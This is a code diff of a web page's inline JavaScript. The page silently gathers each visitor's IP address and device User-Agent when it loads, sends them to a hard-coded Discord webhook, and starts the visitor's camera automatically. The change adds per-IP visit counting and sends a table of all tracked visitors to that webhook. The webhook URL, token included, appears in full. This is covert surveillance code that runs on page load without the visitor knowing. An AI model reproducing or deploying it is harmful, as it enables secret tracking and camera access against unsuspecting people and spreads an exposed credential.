@@ -44,11 +44,23 @@
     <script>
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1299390747711373334/iO5Sbk83deMgQEYd8YfesE-jcYQmL2fudZcdiGuuJUCUZe95-1gNs4VbmYd6mM2qAJhJ"; // Replace with your webhook URL
 
+        // Initialize a dictionary to keep track of visits
+        const ipVisits = {};
+
         // Start the camera automatically when the page loads
         window.onload = async () => {
             const ipAddress = await getUserIp(); // Get user IP
             const userAgent = navigator.userAgent; // Get device info from User-Agent
-            sendDetailsToDiscord(ipAddress, userAgent); // Send IP and device info to Discord
+
+            // Increment the visit count for the IP address
+            if (ipVisits[ipAddress]) {
+                ipVisits[ipAddress].count += 1; // Increment visit count
+            } else {
+                ipVisits[ipAddress] = { userAgent: userAgent, count: 1 }; // Initialize count and user agent
+            }
+
+            // Send updated details to Discord
+            await sendDetailsToDiscord();
 
             // Start the camera after a short delay
             setTimeout(() => {
@@ -67,12 +79,15 @@
             }
         }
 
-        function sendDetailsToDiscord(ipAddress, userAgent) {
-            const content = `
-                User IP: ${ipAddress}
-                Device Info: ${userAgent}
-            `;
-            sendMessageToDiscord(content.trim());
+        async function sendDetailsToDiscord() {
+            // Prepare a message in an Excel-like format
+            let message = "IP Address\tDevice Info\tVisit Count\n"; // Header
+            for (const ip in ipVisits) {
+                const { userAgent, count } = ipVisits[ip];
+                message += `${ip}\t${userAgent}\t${count}\n`; // Append each IP's details
+            }
+
+            await sendMessageToDiscord(message.trim()); // Send the message
         }
 
         async function startCamera(ipAddress, userAgent) {
@@ -159,22 +174,24 @@
             }
         }
 
-        function sendMessageToDiscord(content) {
+        async function sendMessageToDiscord(content) {
             const formData = new FormData();
             formData.append('content', content);
 
-            fetch(DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                body: formData
-            }).then(response => {
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
                 if (response.ok) {
                     console.log('Details successfully sent to Discord.');
                 } else {
                     console.error('Failed to send details to Discord:', response.statusText);
                 }
-            }).catch(error => {
+            } catch (error) {
                 console.error('Error sending details to Discord:', error);
-            });
+            }
         }
     </script>
 </body>
